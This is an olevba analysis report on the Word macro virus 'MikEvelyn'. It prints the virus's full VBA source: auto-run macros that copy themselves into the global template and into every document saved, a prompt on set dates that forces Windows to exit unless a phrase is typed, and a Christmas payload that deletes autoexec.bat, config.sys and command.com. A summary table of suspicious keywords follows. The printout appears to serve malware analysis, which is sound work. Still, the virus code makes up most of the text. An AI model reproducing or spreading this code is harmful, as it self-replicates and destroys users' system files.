olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nj-wmdlk1.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nj-wmdlk1.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MikEvelyn.bas 
in file: Virus.MSWord.Nj-wmdlk1.o - OLE stream: 'Macros/VBA/MikEvelyn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim vinstalled
Dim i
Dim inp$
vinstalled = 0
For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](i, 0, 0) = "MikEvelyn" Then
        vinstalled = 1
    End If
Next i

If vinstalled = 1 Then
    GoTo finish1
Else
    On Error Resume Next
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoSave", "Global:AutoSave", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":ToolsMacro", "Global:ToolsMacro", 1
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":MikEvelyn", "Global:MikEvelyn", 1
End If
finish1:
vinstalled = 0
On Error GoTo -1: On Error GoTo finish2

For i = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](i, 1, 0) = "MikEvelyn" Then
        vinstalled = 1
    End If
Next i

If vinstalled = 1 Then
    GoTo finish2
Else
    On Error Resume Next
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
    WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
    WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
    WordBasic.MacroCopy "Global:AutoSave", WordBasic.[FileName$]() + ":AutoSave", 1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":AutoExec", 1
    WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[FileName$]() + ":ToolsMacro", 1
    WordBasic.MacroCopy "Global:MikEvelyn", WordBasic.[FileName$]() + ":MikEvelyn", 1
    WordBasic.FileSaveAll 1, 0
End If
finish2:

If WordBasic.Month(WordBasic.Now()) = 1 And WordBasic.Day(WordBasic.Now()) = 4 Then
inp$ = WordBasic.[InputBox$]("Type Happy Anniversary MikEvelyn", "MikEvelyn")
    If inp$ <> "Happy Anniversary MikEvelyn" Then
        WordBasic.ExitWindows
    End If
End If
If WordBasic.Month(WordBasic.Now()) = 5 And WordBasic.Day(WordBasic.Now()) = 31 Then
inp$ = WordBasic.[InputBox$]("Type Happy Birthday Edison", "Edison")
    If inp$ <> "Happy Birthday Edison" Then
        WordBasic.ExitWindows
    End If
End If
If WordBasic.Month(WordBasic.Now()) = 12 And WordBasic.Day(WordBasic.Now()) = 25 Then
    On Error Resume Next
    WordBasic.Kill "c:\autoexec.bat"
    WordBasic.Kill "c:\config.sys"
    WordBasic.Kill "c:\command.com"
    WordBasic.MsgBox "Do you know that Christmas is a PAGAN PRACTICE?"
End If


End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nj-wmdlk1.o - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Call "MikEvelyn"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoSave.bas 
in file: Virus.MSWord.Nj-wmdlk1.o - OLE stream: 'Macros/VBA/AutoSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Call "MikEvelyn"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nj-wmdlk1.o - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Call "MikEvelyn"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Nj-wmdlk1.o - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Call "MikEvelyn"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Nj-wmdlk1.o - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.Call "MikEvelyn"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

